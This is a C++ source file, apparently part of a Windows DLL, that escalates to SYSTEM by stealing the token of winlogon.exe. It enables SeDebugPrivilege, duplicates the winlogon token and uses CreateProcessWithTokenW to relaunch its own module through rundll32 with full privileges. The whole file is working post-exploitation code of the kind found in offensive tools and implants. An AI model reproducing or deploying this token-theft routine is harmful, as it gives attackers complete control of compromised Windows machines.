#include "pch.h"

#include <Lmcons.h>
#include <tlhelp32.h>

#include "runtime/utils.h"

extern HINSTANCE hInst;

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

// 第二个参数为NULL的时候, 第三个参数中指定可执行文件路径
bool elevate_execute(DWORD pid, LPCWSTR executable_path, LPWSTR command_line)
{
	// Print whoami to compare to thread later
	printf("[+] Current user is: %s\n", (get_username()).c_str());

	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);

	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}

	// Call OpenProcess(), print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid);
	//HANDLE processHandle = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}

	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}

	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());
		printf("[+] Reverting thread to original user context\n");
		RevertToSelf();
	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}

	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}

	// Call CreateProcessWithTokenW(), print return code and error code
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, executable_path, command_line, 0, NULL, NULL, &startupInfo, &processInformation);
	if (GetLastError() == NULL)
		printf("[+] Process spawned!\n");
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}

	return 0;
}

DWORD getPidByName(LPCWSTR name) {
	DWORD pid = NULL;
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe;
	THREADENTRY32 te;

	pe.dwSize = sizeof(pe);
	te.dwSize = sizeof(te);
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

	Process32First(hSnapshot, &pe);
	do {
		if (lstrcmp(name, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			//if (Thread32First(hSnapshot, &te)) {
			//	do {
			//		if (te.th32OwnerProcessID == pid) {
			//			tids.push_back(te.th32ThreadID);
			//		}
			//	} while (Thread32Next(hSnapshot, &te));
			//}
			break;
		}

	} while (Process32Next(hSnapshot, &pe));
	CloseHandle(hSnapshot);

	return pid;

}

bool get_system()
{
	DWORD pid = getPidByName(L"winlogon.exe");
	if (pid == NULL)
	{
		ErrorExit(L"get_system: Unable to get pid of winlogon.exe.");
	}
	wchar_t module_path[MAX_PATH + 12];
	GetModuleFileName(hInst, module_path, MAX_PATH);
	lstrcat(module_path, L",EntryPoint");
	wchar_t command_line[MAX_PATH + 100];
	lstrcpy(command_line, L"C:\\Windows\\System32\\rundll32.exe ");
	lstrcat(command_line, module_path);
	std::wcout << command_line << std::endl;
	elevate_execute(pid, NULL, command_line);
	return true;
}